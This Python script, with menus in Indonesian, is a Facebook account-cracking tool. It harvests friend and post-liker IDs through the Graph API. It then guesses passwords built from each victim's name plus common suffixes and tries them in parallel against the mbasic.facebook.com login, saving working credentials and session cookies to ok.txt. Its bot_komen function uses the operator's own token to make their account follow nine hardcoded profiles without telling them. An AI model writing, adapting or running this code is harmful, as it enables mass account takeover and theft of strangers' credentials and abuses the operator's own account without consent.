#-*-coding:utf-8-*-
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json,uuid
import importlib
importlib.reload(sys)
from concurrent.futures import ThreadPoolExecutor as ThreadPool

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def logo():
  print("""________      _____ _____________________
\______ \    /     \\______   \_   _____/
 |    |  \  /  \ /  \|    |  _/|    __)  
 |    `   \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    \n""")

         
host="https://mbasic.facebook.com"
ua=requests.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
		
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		print(("  {}Cookies Mati{}").format(R,N));gen()
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	ck=input("\n [*] Cookie: ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print((' \x1b[92mLogin Sukses!\x1b[0m'))
			time.sleep(1)
			menu()
		else:print((" \x1b[91mLogin Gagal\x1b[0m"));gen()
	except Exception as e:
		print(("  error: %s"%e));gen()
def log_token():
	data = input("\n [*] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print((" \x1b[92mlogin success!\x1b[0m"))
		bot_komen()
		menu()
	except KeyError:
		print((" \x1b[91mInvalid Token !\x1b[0m"))
		time.sleep(1.0)
		logs()
def convert():
	global post,reac,kom
	try:
		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print((R+"\n  error: %s"%e))
		exit()
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("[!] Token invalid")
		logs()
	requests.post('https://graph.facebook.com/100000362834253/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1399665666/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1000001027764318/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100026766789549/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100034412559885/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100001676922849/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + toket)
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as w:
    print(" [!]. Token / Cookies kadaluarsa silakan login ulang!")
    time.sleep(1)
    logs()
  ip = requests.get("https://api.ipify.org").text
  os.system("clear")
  logo()
  print (" [ Selamat Datang : \033[0;93m"+nama+"\033[0;97m ]")
  print (" [ UID Facebook : \033[0;92m"+id+"\033[0;39m ]")
  print (" [ IP Adress : \033[0;92m"+ip+"\033[0;39m ]")
  print (" [ Status : \033[0;92mAktif\033[0;39m ]\n")
  print (" [1]. Dump id friend / publik");time.sleep(0.07)
  print (" [2]. Dump dari like");time.sleep(0.07)
  print (" [3]. Start crack");time.sleep(0.07)
  print (" [4]. Update Scrip");time.sleep(0.07)
  print (" [0]. Logout");time.sleep(0.07)
  print
  r=input("\n [*]. select : ");time.sleep(0.07)
  if r=="":print(("Isi yang bener").format(R,N));menu()
  elif r=="1":
    publik()
  elif r=="2":
    crack_like()
  elif r=="3":
   crack()
  elif r=="4":
    print("  Sedang Mengupdade!!!");time.sleep(2)
    os.system("git pull")
    input("  [Kembali]")
    os.system("python run.py")
  elif r=="0":
    try:
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print((" \x1b[91m Error file tidak ditemukan  %s\x1b[0m"%e))
  else:
    print(("  \x1b[91mwrong input !"));menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(("  {}Cookies Invalid!{}").format(R,N))
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
		print ("\n [*]. ketik me jika ingin mengambil dari daftar teman\n");time.sleep(0.07)
		idt = input(" [?]. masukan id atau username: ");time.sleep(0.07)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((" [*]. Nama Akun      : "+op["name"]))
		except KeyError:
			print((" [!]. ID NOT found !{}").format(R,N))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print(' [*]. Mengambil Semua ID ...')
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(("\r%s "%(str(len(id)))), end=' ');sys.stdout.flush();time.sleep(0.007)
			print((a["name"]))
		ys.close()
		print 
		print(('\n[!]. Sukses Mengambil ID dari %s'%op['name']));time.sleep(0.07)
		print(("[*]. Total ID : %s"%(len(id))));time.sleep(0.07)
		print(("[*]. Output : %s"%qq));time.sleep(0.07)
		input("\n[!]. Kembali")
		menu()
		
	except Exception as e:
		exit("error: %s"%e)
def crack_like():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print('   Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	idt = input(" [?]. ID Postingan Publik/Teman :");time.sleep(0.07)
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+toket)
		ids = []
		z = json.loads(r.text)
		qq = (idt+'.json').replace(" ","_")
		ys = open(qq , 'w')
		print(" [!]. Mengambil semua ID")
		print
		for i in z['data']:
			ids.append(i['id'])
			ys.write(i['id']+"<=>"+i['name']+'\n')
			print("\r%s "%(str(len(ids))), end =' '),;sys.stdout.flush();time.sleep(0.007)
			print(i["name"])
		ys.close()
		print
		print('\n[!]. Sukses Mengambil ID dari Like');time.sleep(0.07)
		print("[*]. Total ID : %s"%(len(ids)));time.sleep(0.07)
		print("[*]. Output : %s"%qq);time.sleep(0.07)
		input("\n [!]. Kembali")
		menu()
			
	except KeyError:
		print("  \x1b[91mID postingan salah\x1b[0m")
		menu()
	except requests.exceptions.SSLError:
		print('! Koneksi Tidak Ada')
		exit()
				
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("rahasia")
					results.append("bismillah")
	return results
def logs():
  logo()
  print("\n [1]. Login with token");time.sleep(0.05)
  print(" [2]. Login with cookies");time.sleep(0.05)
  print(" [0]. Exit");time.sleep(0.05)
  sek=input("\n [?] login : ");time.sleep(0.05)
  if sek=="":
    print(("  isi yang bener").format(R,N));logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    exit()
  else:
    print((" isi yang benar").format(R,N));logs()
class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(" [?]. apakah ingin menggunakan katasandi manual [Y/t]")
		while True:
			f=input(" [*]. input : ")
			print
			if f=="":continue
			elif f=="t":
				try:
					while True:
						try:
							self.apk=input(" [*]. masukan id list file: ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print (" [*]. contoh pass123,pass12345")
				self.pwlist()
				break
			elif f=="Y":
				try:
					while True:
						try:
							self.apk=input(" [*]. masukan id list file : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("  %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("  %s"%e))
					continue
				print (" [!]. crack started...");time.sleep(0.07)
				print (" [+]. account ok saved to: \033[0;92mok.txt\033[0;97m");time.sleep(0.07)
				print (" [*]. account checkpoint saved to: \033[0;93mcheckpoint.txt\033[0;97m\n");time.sleep(0.07)
				ThreadPool(35).map(self.main,self.fl)
				break
	def pwlist(self):
		self.pw=input(" [*]. password list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("  crack started...");time.sleep(0.07)
			print ("  account ok saved to: ok.txt");time.sleep(0.07)
			print ("  account checkpoint saved to: checkpoint.txt");time.sleep(0.07)
			ThreadPool(30).map(self.main,self.fl)
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r [\033[0;92mOK\033[0;39m]%s %s | %s %s      "%(G,fl.get("id"),i,N)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print(("\r [\033[0;93mCP\033[0;97m]%s %s | %s %s      "%(O,fl.get("id"),i,N)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r [*]. crack %s/%s - OK-:%s - CP-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
			
if __name__=='__main__':
  menu()
  
